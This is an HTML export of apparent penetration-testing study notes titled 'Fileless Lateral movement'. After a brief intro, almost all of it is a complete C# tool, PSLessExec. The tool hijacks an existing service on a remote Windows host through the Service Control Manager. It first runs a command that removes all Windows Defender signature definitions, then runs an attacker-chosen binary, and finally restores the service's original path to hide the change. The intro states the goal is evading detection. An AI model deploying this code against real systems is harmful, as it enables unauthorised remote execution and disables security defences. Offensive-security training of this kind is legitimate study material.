<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Fileless Lateral movement</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Fileless Lateral movement</h1><br/><p><h2>Intro</h2><ul><li>• <small>• PsExec and DCOM, require that services and files are written on the target system.</small></li><li><small> Other techniques, such as PSRemoting,require ports to be open in the firewall that are not always permitted by default</small></li><li><small>In the following sections, we are going to discuss and implement a variant of PsExec that neither writes a file to disk nor creates an additional service to obtain code execution, both of which may aid in bypassing detection.</small></li></ul></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> PSLessExec<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SC_MANAGER_ALL_ACCESS = <span style="color:#ff0044;font-weight:400">0xF003F</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SERVICE_ALL_ACCESS = <span style="color:#ff0044;font-weight:400">0xF01FF</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SERVICE_DEMAND_START = <span style="color:#ff0044;font-weight:400">0x3</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SERVICE_NO_CHANGE = <span style="color:#ff0044;font-weight:400">0xffffffff</span>;<br /><br />        [StructLayout(LayoutKind.Sequential)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> QUERY_SERVICE_CONFIG<br />        {<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> UInt32 dwServiceType;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> UInt32 dwStartType;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> UInt32 dwErrorControl;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> String lpBinaryPathName;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> String lpLoadOrderGroup;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> UInt32 dwTagID;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> String lpDependencies;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> String lpServiceStartName;<br />            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]<br />            <span style="color:#ff9d00;font-weight:700">public</span> String lpDisplayName;<br />        };<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, EntryPoint = <span style="color:#3ad900;font-weight:400">&quot;OpenSCManagerW&quot;</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Unicode, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenSCManager(<span style="color:#7f0044;font-weight:400">string</span> machineName, <span style="color:#7f0044;font-weight:400">string</span> databaseName, <span style="color:#7f0044;font-weight:400">uint</span> dwAccess);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenService(IntPtr hSCManager, <span style="color:#7f0044;font-weight:400">string</span> lpServiceName, <span style="color:#7f0044;font-weight:400">uint</span> dwDesiredAccess);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, CharSet = CharSet.Unicode, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, <span style="color:#ff9d00;font-weight:700">out</span> UInt32 pcbBytesNeeded);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, EntryPoint = <span style="color:#3ad900;font-weight:400">&quot;ChangeServiceConfig&quot;</span>)]<br />        [<span style="color:#ff9d00;font-weight:700">return</span>: MarshalAs(UnmanagedType.Bool)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ChangeServiceConfigA(IntPtr hService, <span style="color:#7f0044;font-weight:400">uint</span> dwServiceType, <span style="color:#7f0044;font-weight:400">uint</span> dwStartType, <span style="color:#7f0044;font-weight:400">int</span> dwErrorControl, <span style="color:#7f0044;font-weight:400">string</span> lpBinaryPathName, <span style="color:#7f0044;font-weight:400">string</span> lpLoadOrderGroup, <span style="color:#7f0044;font-weight:400">string</span> lpdwTagId, <span style="color:#7f0044;font-weight:400">string</span> lpDependencies, <span style="color:#7f0044;font-weight:400">string</span> lpServiceStartName, <span style="color:#7f0044;font-weight:400">string</span> lpPassword, <span style="color:#7f0044;font-weight:400">string</span> lpDisplayName);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        [<span style="color:#ff9d00;font-weight:700">return</span>: MarshalAs(UnmanagedType.Bool)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> StartService(IntPtr hService, <span style="color:#7f0044;font-weight:400">int</span> dwNumServiceArgs, <span style="color:#7f0044;font-weight:400">string</span>[] lpServiceArgVectors);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#ff9d00;font-weight:700">if</span> (args.Length != <span style="color:#ff0044;font-weight:400">3</span>)<br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]&quot;</span>);<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Example: PSLessExec.exe appsrv01 SensorService notepad.exe&quot;</span>);<br />                <span style="color:#ff9d00;font-weight:700">return</span>;<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// Open remote SCManager</span><br />            IntPtr SCMHandle = OpenSCManager(args[<span style="color:#ff0044;font-weight:400">0</span>], <span style="color:#ff0044;font-weight:700">null</span>, SC_MANAGER_ALL_ACCESS);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got handle on SCManager on {args[0]}: {SCMHandle}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Access target service</span><br />            IntPtr schService = OpenService(SCMHandle, args[<span style="color:#ff0044;font-weight:400">1</span>], SERVICE_ALL_ACCESS);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got handle on target service {args[1]}: {schService}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get current binPath (two passes, first is to determine the buffer size needed)</span><br />            UInt32 dwBytesNeeded;<br />            QUERY_SERVICE_CONFIG qsc = <span style="color:#ff9d00;font-weight:700">new</span> QUERY_SERVICE_CONFIG();<br />            <span style="color:#7f0044;font-weight:400">bool</span> bResult = QueryServiceConfig(schService, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, <span style="color:#ff9d00;font-weight:700">out</span> dwBytesNeeded);<br />            IntPtr ptr = Marshal.AllocHGlobal((<span style="color:#7f0044;font-weight:400">int</span>)dwBytesNeeded);<br />            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, <span style="color:#ff9d00;font-weight:700">out</span> dwBytesNeeded);<br />            Marshal.PtrToStructure(ptr, qsc);<br />            String binPathOrig = qsc.lpBinaryPathName;<br /><br />            <span style="color:#0088ff;font-weight:400">// Pass 1: Disable Defender signatures</span><br />            String defBypass = <span style="color:#3ad900;font-weight:400">&quot;\&quot;C:\\Program Files\\Windows Defender\\MpCmdRun.exe\&quot; -RemoveDefinitions -All&quot;</span>;<br />             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, <span style="color:#ff0044;font-weight:400">0</span>, defBypass, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Overwrote service executable to become &#39;{defBypass}&#39;, result: {bResult}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Run the service for Pass 1</span><br />            bResult = StartService(schService, <span style="color:#ff0044;font-weight:400">0</span>, <span style="color:#ff0044;font-weight:700">null</span>);<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Launched service, defender signatures should be wiped.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Pass 2: Run the chosen binary</span><br />            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, <span style="color:#ff0044;font-weight:400">0</span>, args[<span style="color:#ff0044;font-weight:400">2</span>], <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Overwrote service executable to become &#39;{args[2]}&#39;, result: {bResult}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Run the service for Pass 2</span><br />            bResult = StartService(schService, <span style="color:#ff0044;font-weight:400">0</span>, <span style="color:#ff0044;font-weight:700">null</span>);<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Launched service. Check for execution!&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Pass 3: Restore original binPath</span><br />            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, <span style="color:#ff0044;font-weight:400">0</span>, binPathOrig, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff0044;font-weight:700">null</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Restored service binary to &#39;{binPathOrig}&#39;, result: {bResult}.&quot;</span>);<br />        }<br />    }<br />}</pre></div></p></div>
</body>
</html>
